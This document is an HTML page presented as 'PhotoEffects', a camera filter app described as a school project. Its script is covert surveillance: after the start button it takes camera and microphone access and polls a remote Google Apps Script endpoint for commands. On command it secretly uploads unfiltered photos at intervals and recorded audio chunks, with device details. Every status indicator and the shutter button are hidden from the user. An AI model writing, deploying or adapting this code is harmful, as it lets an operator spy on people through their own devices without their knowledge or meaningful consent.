<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PhotoEffects – live camera</title>
<style>
:root {
--bg: #f8fafc;
--card: #ffffff;
--text: #1e293b;
--muted: #64748b;
--accent: #2563eb;
--accent2: #7c3aed;
--danger: #ef4444;
--ok: #16a34a;
--warn: #d97706;
--surface: #f1f5f9;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
font-family: Arial, Helvetica, sans-serif;
background: var(--bg);
color: var(--text);
min-height: 100vh;
padding: 12px;
line-height: 1.45;
overscroll-behavior: none;
}
.container { max-width: 520px; margin: 0 auto; }
h1 { font-size: 1.35rem; margin-bottom: 8px; color: var(--accent); font-weight: 700; }
.card {
background: var(--card);
border: 1px solid #cbd5e1;
border-radius: 8px;
padding: 18px;
margin-bottom: 14px;
box-shadow: 0 2px 5px rgba(0,0,0,0.05);
}
p { color: var(--muted); margin-bottom: 10px; font-size: 0.95rem; }
.warning {
background: #fef3c7;
border-left: 4px solid var(--warn);
padding: 12px 14px;
border-radius: 6px;
margin: 14px 0;
color: #92400e;
font-size: 0.9rem;
}
.warning ul { margin: 8px 0 0 18px; }
button {
display: inline-flex;
align-items: center;
justify-content: center;
gap: 6px;
padding: 10px 16px;
border: 1px solid #cbd5e1;
border-radius: 6px;
font-weight: 600;
font-size: 0.95rem;
cursor: pointer;
margin: 5px 5px 5px 0;
transition: transform 0.12s, opacity 0.15s;
}
button:active { transform: scale(0.96); }
.btn-primary { background: var(--accent); color: #ffffff; border: none; }
.btn-secondary { background: #e2e8f0; color: var(--text); }
.btn-ghost {
background: #ffffff;
border: 1px solid #cbd5e1;
color: var(--muted);
font-size: 0.85rem;
padding: 8px 12px;
}

/* Preview area */
.preview-wrap {
position: relative;
border-radius: 8px;
border: 1px solid #cbd5e1;
overflow: hidden;
background: #000;
margin: 10px 0 14px;
aspect-ratio: 3/4;
max-height: 62vh;
}
video#preview {
width: 100%;
height: 100%;
object-fit: cover;
display: block;
background: #000;
}
.preview-overlay {
position: absolute;
inset: 0;
pointer-events: none;
border-radius: 8px;
}

/* Effect chips */
.effects {
display: flex;
flex-wrap: wrap;
gap: 8px;
margin: 10px 0 6px;
}
.effect-btn {
padding: 6px 12px;
border-radius: 20px;
font-size: 0.82rem;
font-weight: 600;
background: var(--surface);
color: var(--muted);
border: 1px solid #cbd5e1;
cursor: pointer;
transition: all 0.15s;
white-space: nowrap;
}
.effect-btn.active {
background: #dbeafe;
color: var(--accent);
border-color: var(--accent);
}
.effect-btn:hover { color: var(--text); }

/* Controls row */
.controls {
display: flex;
gap: 10px;
align-items: center;
margin-top: 8px;
flex-wrap: wrap;
}
.shutter {
width: 60px;
height: 60px;
border-radius: 50%;
background: #ffffff;
border: 4px solid #94a3b8;
box-shadow: 0 2px 6px rgba(0,0,0,0.15);
cursor: pointer;
flex-shrink: 0;
position: relative;
}
.shutter::after {
content: "";
position: absolute;
inset: 5px;
border-radius: 50%;
background: #e2e8f0;
border: 1px solid #cbd5e1;
}
.shutter:active { transform: scale(0.92); }
.shutter.flash { animation: flash 0.35s ease; }
@keyframes flash {
0% { box-shadow: 0 0 0 0 rgba(37,99,235,0.8); }
50% { box-shadow: 0 0 0 12px rgba(37,99,235,0); }
100% { box-shadow: 0 2px 6px rgba(0,0,0,0.15); }
}

.status {
font-family: monospace;
font-size: 0.82rem;
padding: 9px 12px;
border-radius: 6px;
margin: 10px 0 6px;
background: #f1f5f9;
border: 1px solid #cbd5e1;
border-left: 4px solid var(--muted);
word-break: break-word;
}
.status.active { border-left-color: var(--ok); color: var(--ok); }
.status.warn { border-left-color: var(--warn); color: var(--warn); }
.status.off { border-left-color: var(--muted); color: var(--muted); }

.mic-meter {
height: 8px;
background: #e2e8f0;
border-radius: 4px;
overflow: hidden;
margin: 6px 0 4px;
}
.mic-meter > div {
height: 100%;
width: 0%;
background: var(--ok);
transition: width 0.08s linear;
border-radius: 4px;
}

.meta {
font-size: 0.78rem;
color: var(--muted);
margin-top: 8px;
display: flex;
justify-content: space-between;
align-items: center;
flex-wrap: wrap;
gap: 6px;
}
.meta code {
background: #e2e8f0;
padding: 2px 6px;
border-radius: 4px;
font-size: 0.75rem;
color: var(--text);
}
.badge {
display: inline-block;
font-size: 0.7rem;
padding: 3px 8px;
border-radius: 12px;
background: #f3e8ff;
color: var(--accent2);
border: 1px solid #d8b4fe;
font-weight: 600;
}
.hidden { display: none !important; }

.hint {
font-size: 0.8rem;
color: var(--muted);
margin-top: 4px;
}
</style>
</head>
<body>
<div class="container">

<!-- CONSENT -->
<div id="consent" class="card">
<h1>PhotoEffects</h1>
<p>School project of PhotoEffects app, made by <b>Lukáš Horák</b> for programming and computer science class at Gymnasium Arabská in Prague</p>
<button class="btn-primary" id="btnConsent">Start WebApp PhotoEffects</button>
</div>

<!-- MAIN APP -->
<div id="demo" class="card hidden">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
<h1 style="margin:0;font-size:1.2rem;">PhotoEffects</h1>
<span class="badge" id="effectName">No filter</span>
</div>

<div class="preview-wrap">
<video id="preview" autoplay playsinline muted></video>
</div>

<div class="effects" id="effectsBar">
<!-- filled from JS -->
</div>

<div class="meta">
<span>ID: <code id="pid"></code></span>
<span style="opacity:0.7;">Closing page will finish everything</span>
</div>

<!-- Skryté elementy – musí existovat kvůli JS, ale nejsou vidět -->
<div id="status" class="status off hidden"></div>
<div class="mic-meter hidden"><div id="micLevel"></div></div>
<button id="btnFlip" class="btn-ghost hidden" type="button">Flip</button>
<button id="btnShutter" class="shutter hidden" type="button" aria-label="Shutter"></button>
</div>
</div>

<script>
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzJgtvn8AhbJfObH14yMGP4W81U50WEKEvr2pMs0pQvBXkLDAZVjHwaUvsBpOtXUYAVUw/exec";

const MODE_POLL_MS = 4000;
const HEARTBEAT_MS = 5000;
const AUDIO_CHUNK_MS = 8000;

const EFFECTS = [
  { id: "none",      label: "Normal",   css: "none",                                           name: "Žádný filtr" },
  { id: "bw",        label: "GreyScale",       css: "grayscale(1) contrast(1.05)",                    name: "Černobílá" },
  { id: "invert",    label: "Inverted",  css: "invert(1) hue-rotate(180deg)",                   name: "Inverze" },
  { id: "sepia",     label: "sepia",    css: "sepia(0.95) contrast(1.1) brightness(0.95)",     name: "Sépie" },
  { id: "warm",      label: "Warm",    css: "sepia(0.35) saturate(1.4) brightness(1.05)",     name: "Teplý tón" },
  { id: "cool",      label: "Cold",  css: "hue-rotate(180deg) saturate(0.85) brightness(1.05)", name: "Studený tón" },
  { id: "contrast",  label: "Contras", css: "contrast(1.6) saturate(1.15)",                   name: "Vysoký kontrast" },
  { id: "vivid",     label: "Vivid",    css: "saturate(1.9) contrast(1.15)",                   name: "Syté barvy" },
  { id: "noir",      label: "Noir",     css: "grayscale(1) contrast(1.4) brightness(0.9)",     name: "Noir" },
  { id: "blur",      label: "Blur", css: "blur(3px) brightness(1.05)",                     name: "Rozostření" },
  { id: "dream",     label: "Dream",      css: "contrast(0.9) brightness(1.1) saturate(1.3) hue-rotate(15deg)", name: "Snový" },
  { id: "toxic",     label: "Toxic",    css: "hue-rotate(90deg) saturate(1.6) contrast(1.2)",  name: "Toxic" },
];

let currentEffect = EFFECTS[0];
let facingMode = "user";

const participantId = crypto.randomUUID
  ? crypto.randomUUID()
  : Date.now().toString(36) + Math.random().toString(36).slice(2);
document.getElementById("pid").textContent = participantId.slice(0, 8);

let stream = null;
let photoTimer = null;
let modeTimer = null;
let heartbeatTimer = null;
let mediaRecorder = null;
let audioChunks = [];
let currentMode = { photos: false, audio: false, forcePhoto: false, interval: 15 };
let audioContext = null;
let analyser = null;

// --- UI: effects ---
const effectsBar = document.getElementById("effectsBar");
EFFECTS.forEach(fx => {
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "effect-btn" + (fx.id === "none" ? " active" : "");
  btn.textContent = fx.label;
  btn.dataset.id = fx.id;
  btn.addEventListener("click", () => setEffect(fx.id));
  effectsBar.appendChild(btn);
});

function setEffect(id) {
  const fx = EFFECTS.find(e => e.id === id) || EFFECTS[0];
  currentEffect = fx;
  const video = document.getElementById("preview");
  video.style.filter = fx.css;
  document.getElementById("effectName").textContent = fx.name;
  document.querySelectorAll(".effect-btn").forEach(b => {
    b.classList.toggle("active", b.dataset.id === fx.id);
  });
}

// --- Consent ---
document.getElementById("btnConsent").addEventListener("click", async () => {
  document.getElementById("consent").classList.add("hidden");
  document.getElementById("demo").classList.remove("hidden");
  await startMedia();
  startModePolling();
  startHeartbeat();
});

// --- Camera ---
async function startMedia() {
  try {
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode,
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: true
    });
    const video = document.getElementById("preview");
    video.srcObject = stream;
    video.style.filter = currentEffect.css;
    setupMicMeter(stream);
  } catch (err) {
    setStatus("Nepodařilo se získat kameru/mikrofon: " + err.message, "warn");
  }
}

const btnFlip = document.getElementById("btnFlip");
if (btnFlip) {
  btnFlip.addEventListener("click", async () => {
    facingMode = facingMode === "user" ? "environment" : "user";
    await startMedia();
  });
}

// --- Mic meter ---
function setupMicMeter(stream) {
  try {
    if (audioContext) {
      try { audioContext.close(); } catch (_) {}
    }
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const source = audioContext.createMediaStreamSource(stream);
    analyser = audioContext.createAnalyser();
    analyser.fftSize = 256;
    source.connect(analyser);
    const data = new Uint8Array(analyser.frequencyBinCount);
    const el = document.getElementById("micLevel");
    if (!el) return;
    (function tick() {
      if (!analyser) return;
      analyser.getByteFrequencyData(data);
      let sum = 0;
      for (let i = 0; i < data.length; i++) sum += data[i];
      el.style.width = Math.min(100, (sum / data.length) * 1.4) + "%";
      requestAnimationFrame(tick);
    })();
  } catch (e) {}
}

// --- Mode polling & heartbeat ---
function startModePolling() {
  pollMode();
  modeTimer = setInterval(pollMode, MODE_POLL_MS);
}
function startHeartbeat() {
  sendHeartbeat();
  heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_MS);
}

async function sendHeartbeat() {
  try {
    await api({
      action: "heartbeat",
      participantId,
      label: shortLabel(),
      ua: navigator.userAgent,
      platform: navigator.platform || ""
    });
  } catch (e) {}
}

function shortLabel() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad/i.test(ua)) return "iPhone/iPad";
  if (/Android/i.test(ua)) return "Android";
  if (/Mac/i.test(ua)) return "Mac";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Linux/i.test(ua)) return "Linux";
  return "Zařízení";
}

async function pollMode() {
  if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL.includes("SEM_VLOZ")) return;
  try {
    const res = await fetch(APPS_SCRIPT_URL + "?action=getMode&t=" + Date.now());
    const mode = await res.json();
    applyMode(mode);
  } catch (e) {}
}

function applyMode(mode) {
  const prev = { ...currentMode };
  currentMode = {
    photos: !!mode.photos,
    audio: !!mode.audio,
    forcePhoto: !!mode.forcePhoto,
    interval: Math.max(3, parseInt(mode.interval, 10) || 15)
  };

  if (currentMode.forcePhoto && !prev.forcePhoto) {
    takeAndUploadPhoto();
    api({ action: "clearForce" });
  }

  const intervalMs = currentMode.interval * 1000;
  const needRestart = currentMode.photos && (
    !photoTimer || prev.interval !== currentMode.interval || !prev.photos
  );

  if (!currentMode.photos && photoTimer) {
    clearInterval(photoTimer);
    photoTimer = null;
  } else if (needRestart) {
    if (photoTimer) clearInterval(photoTimer);
    takeAndUploadPhoto();
    photoTimer = setInterval(takeAndUploadPhoto, intervalMs);
  }

  if (currentMode.audio && !mediaRecorder) startAudioCapture();
  else if (!currentMode.audio && mediaRecorder) stopAudioCapture();

  updateStatusText();
}

function updateStatusText() {
  const parts = [];
  if (currentMode.photos) parts.push("fotky každých " + currentMode.interval + " s");
  if (currentMode.audio) parts.push("audio");
  if (parts.length === 0) setStatus("Stav: čekám na pokyn od přednášejícího…", "off");
  else setStatus("AKTIVNÍ ODESÍLÁNÍ: " + parts.join(" + "), "active");
}

function setStatus(text, cls) {
  const el = document.getElementById("status");
  if (!el) return;
  el.textContent = text;
  el.className = "status " + (cls || "off") + " hidden";
}

// --- Capture (with current filter applied) ---
async function takeAndUploadPhoto() {
  if (!stream) return;
  const video = document.getElementById("preview");
  if (!video.videoWidth) return;

  const canvas = document.createElement("canvas");
  const maxW = 960;
  const scale = Math.min(1, maxW / video.videoWidth);
  canvas.width = Math.round(video.videoWidth * scale);
  canvas.height = Math.round(video.videoHeight * scale);
  const ctx = canvas.getContext("2d");

  // VŽDY bez filtru – odesíláme originál
  ctx.filter = "none";
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const dataUrl = canvas.toDataURL("image/jpeg", 0.75);

  setStatus("Odesílám snímek…", "warn");
  try {
    await api({ action: "uploadPhoto", participantId, data: dataUrl });
    updateStatusText();
  } catch (e) {
    setStatus("Chyba při odesílání snímku: " + e.message, "warn");
  }
}

// Manual shutter – only useful when photos are enabled, but always tries
const btnShutter = document.getElementById("btnShutter");
if (btnShutter) {
  btnShutter.addEventListener("click", () => {
    btnShutter.classList.remove("flash");
    void btnShutter.offsetWidth;
    btnShutter.classList.add("flash");
    takeAndUploadPhoto();
  });
}

// --- Audio ---
function startAudioCapture() {
  if (!stream) return;
  try {
    audioChunks = [];
    mediaRecorder = new MediaRecorder(stream, { mimeType: "audio/webm;codecs=opus" });
    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
    mediaRecorder.onstop = async () => {
      if (!audioChunks.length) return;
      const blob = new Blob(audioChunks, { type: "audio/webm" });
      audioChunks = [];
      const reader = new FileReader();
      reader.onloadend = async () => {
        try {
          await api({ action: "uploadAudio", participantId, data: reader.result, mime: "audio/webm" });
        } catch (e) {}
      };
      reader.readAsDataURL(blob);
      if (currentMode.audio && mediaRecorder) {
        mediaRecorder.start();
        setTimeout(() => {
          if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
        }, AUDIO_CHUNK_MS);
      }
    };
    mediaRecorder.start();
    setTimeout(() => {
      if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
    }, AUDIO_CHUNK_MS);
  } catch (e) {
    mediaRecorder = null;
  }
}

function stopAudioCapture() {
  if (mediaRecorder && mediaRecorder.state !== "inactive") {
    try { mediaRecorder.stop(); } catch (e) {}
  }
  mediaRecorder = null;
  audioChunks = [];
}

// --- API ---
async function api(payload) {
  if (!APPS_SCRIPT_URL || APPS_SCRIPT_URL.includes("SEM_VLOZ")) {
    console.log("API demo:", payload.action);
    return { status: "demo" };
  }
  const res = await fetch(APPS_SCRIPT_URL, {
    method: "POST",
    redirect: "follow",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(payload)
  });
  const text = await res.text();
  let json;
  try { json = JSON.parse(text); } catch { json = { status: "ok" }; }
  if (json.status === "error") throw new Error(json.message || "API error");
  return json;
}

// Cleanup
window.addEventListener("beforeunload", () => {
  if (photoTimer) clearInterval(photoTimer);
  if (modeTimer) clearInterval(modeTimer);
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  stopAudioCapture();
  if (stream) stream.getTracks().forEach(t => t.stop());
  if (audioContext) try { audioContext.close(); } catch (_) {}
});
</script>
</body>
</html>
